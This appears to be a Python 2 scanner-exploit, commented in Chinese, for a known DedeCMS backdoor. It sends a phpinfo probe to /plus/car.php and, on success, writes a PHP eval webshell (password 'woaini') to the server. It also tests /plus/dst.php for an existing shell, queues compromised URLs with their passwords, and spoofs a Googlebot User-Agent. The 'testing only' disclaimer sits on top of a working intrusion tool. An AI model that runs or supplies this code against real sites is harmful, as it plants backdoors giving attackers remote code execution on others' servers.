#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
##神龙:29295842    BLOG:http://hi.baidu.com/alalmn
#本软件只是测试使用  大家别乱想啊
#针对官方留下的后门
#参考https://www.t00ls.net/thread-23103-1-1.html
#转换方法 http://wdot.cc/dede.php
#http://bugscan.net/plugin/84
import httplib
import sys
import threading
sys.path.append('..')
import Class_Queue
import yijuhua

###########dedecms官方一句话扫描##########################
class dedecms_yijuhua(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #URL
        if not(("http://" in self.url) or ("https://" in self.url)):
            self.url="http://"+self.url
        self.scan(self.url)
        self.find(url)
        #print "%s close--dedecms_yijuhua!!!!!"%(self.url)

    def scan(self,arg):
        url = arg.split('//')[1]
        site = '/5.66/plus/car.php'
        data = '''$a=${@phpinfo()};'''
        heareds = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)","Content-type":"application/x-www-form-urlencoded"}
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('POST',site,data,heareds)
            httpres = conn.getresponse()
            html = httpres.read()
            if 'allow_url_fopen' in html:
                self.echo(url)
            else:
                self.find(url)
        except Exception,e:
            #print e
            return False
    def echo(self,arg):
        site = '/plus/car.php'
        data = '''$a=${@file_put_contents("shaoxiao.php","<?php eval(\$_POST[woaini]); ?>")};'''
        heareds = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
        conn = httplib.HTTPConnection(arg)
        try:
            conn.request('POST',site,data,heareds)
            #httpres = conn.getresponse()
            data='http://%s/plus/shaoxiao.php' % arg

#            EXP_list=[]    #["网址","漏洞类型","漏洞地址","备注"]
#            EXP_list.append(arg)
#            EXP_list.append("exp_dedecms_yijuhua")
#            EXP_list.append(data)
#            EXP_list.append("webshell--pass:woaini")
#            Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
            EXP_list=[self.url,"exp","exp_dedecms_yijuhua",data,"woaini","webshell"]
            ##["网址","漏洞类型","漏洞详细信息","漏洞地址","密码","备注"]
            #print EXP_list
            Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
            #print "exp_dedecms_yijuhua---%s---%s"%(data,"webshell--pass:woaini")
        except Exception,e:
            #print e
            return False

    def find(self,arg):
        site = '/plus/dst.php'
        heareds = {"User-Agent":"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
        conn = httplib.HTTPConnection(arg)
        try:
            conn.request('GET',site,None,heareds)
            httpres = conn.getresponse()
            if httpres.status == 200:
                data='http://%s/plus/dst.php' % arg
                if yijuhua.yijuhua_cs("php",data,"cmd"):   #ASP还是PHP  ,URL地址 ，密码
                #是
                    EXP_list=[self.url,"exp","exp_dedecms_yijuhua",data,"cmd","webshell"]
                    ##["网址","漏洞类型","漏洞详细信息","漏洞地址","密码","备注"]
                    #print EXP_list
                    Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
        except Exception,e:
            #print e
            return False


################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(dedecms_yijuhua("找不到测试站点"))

    for t in threads:
        t.start()




